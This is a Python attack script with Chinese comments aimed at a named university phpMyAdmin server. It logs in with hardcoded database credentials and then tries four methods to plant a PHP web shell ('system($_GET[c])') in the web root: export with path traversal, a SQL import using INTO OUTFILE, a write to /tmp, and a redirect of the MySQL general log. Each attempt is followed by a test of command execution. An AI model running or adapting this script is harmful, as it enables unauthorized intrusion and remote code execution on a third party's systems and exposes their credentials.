#!/usr/bin/env python3
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://olympic.su.ac.th/phpmyadmin/"
session = requests.Session()
session.verify = False

# 登录
login_data = {"pma_username": "mysql", "pma_password": "Mu123.123.", "server": "1"}
resp = session.post(url + "index.php", data=login_data, allow_redirects=True)
token = re.search(r'token=([a-f0-9]+)', resp.text).group(1)

print(f"[+] Token: {token}")

# 方法1: 通过导出功能写入shell
print("[*] 方法1: phpMyAdmin导出功能...")
# 创建包含shell代码的表
sql_create = "CREATE TABLE IF NOT EXISTS scmeeting.shell(code TEXT);"
sql_data = {"sql_query": sql_create, "db": "scmeeting"}
session.post(url + "db_sql.php", params={"token": token, "db": "scmeeting"}, data=sql_data, verify=False)

sql_insert = "INSERT INTO scmeeting.shell VALUES('<?php system($_GET[\"c\"]); ?>');"
sql_data = {"sql_query": sql_insert, "db": "scmeeting"}
session.post(url + "db_sql.php", params={"token": token, "db": "scmeeting"}, data=sql_data, verify=False)

# 尝试导出到文件
export_data = {
    "export_type": "sql",
    "what": "sql",
    "sql_query": "SELECT code FROM scmeeting.shell;",
    "sql_delimiter": ";",
    "asfile": "1",
    "filename_template": "../../../../var/www/html/enmeeting/shell.php",
    "remember_template": "on",
}

# 尝试通过导出接口
export_url = url + f"db_export.php?db=scmeeting&token={token}"
resp = session.post(export_url, data=export_data, verify=False, timeout=10)

test_shell = requests.get("https://olympic.su.ac.th/enmeeting/shell.php?c=id", verify=False, timeout=5)
if "uid=" in test_shell.text:
    print(f"[+] Shell获取成功: https://olympic.su.ac.th/enmeeting/shell.php?c=id")
    exit(0)

# 方法2: 通过备份恢复功能
print("[*] 方法2: 备份恢复功能...")
backup_content = """-- MySQL dump
SELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '/var/www/html/enmeeting/shell.php';
"""
files = {"import_file": ("backup.sql", backup_content, "application/sql")}
data = {"format": "sql", "token": token, "db": "scmeeting"}
resp = session.post(url + "db_import.php", params={"token": token, "db": "scmeeting"}, files=files, data=data, verify=False, timeout=10)

test_shell = requests.get("https://olympic.su.ac.th/enmeeting/shell.php?c=id", verify=False, timeout=5)
if "uid=" in test_shell.text:
    print(f"[+] Shell获取成功(备份恢复)")
    exit(0)

# 方法3: 通过SQL执行写入到已知可写位置
print("[*] 方法3: 尝试写入到/tmp然后通过文件包含...")
sql = "SELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '/tmp/shell.php';"
sql_data = {"sql_query": sql, "db": "mysql"}
session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)

# 如果主站有文件包含，可以包含/tmp/shell.php
# 但需要先找到文件包含漏洞

# 方法4: 通过数据库日志，但写入到web可访问位置
print("[*] 方法4: 数据库日志到web目录...")
log_paths = [
    "/var/www/html/enmeeting/log.php",
    "/var/www/html/log.php",
    "/var/www/enmeeting/log.php",
]

for log_path in log_paths:
    sql = f"SET GLOBAL general_log_file = '{log_path}';"
    sql_data = {"sql_query": sql, "db": "mysql"}
    session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)
    
    sql = "SET GLOBAL general_log = 'ON';"
    sql_data = {"sql_query": sql, "db": "mysql"}
    session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)
    
    sql = "SELECT '<?php system($_GET[\"c\"]); ?>';"
    sql_data = {"sql_query": sql, "db": "mysql"}
    session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)
    
    sql = "SET GLOBAL general_log = 'OFF';"
    sql_data = {"sql_query": sql, "db": "mysql"}
    session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)
    
    # 测试
    http_path = log_path.replace("/var/www/html", "")
    test_url = f"https://olympic.su.ac.th{http_path}?c=id"
    test_resp = requests.get(test_url, verify=False, timeout=5)
    if "uid=" in test_resp.text:
        print(f"[+] Shell获取成功: {test_url}")
        exit(0)

print("[-] 继续尝试其他方法...")
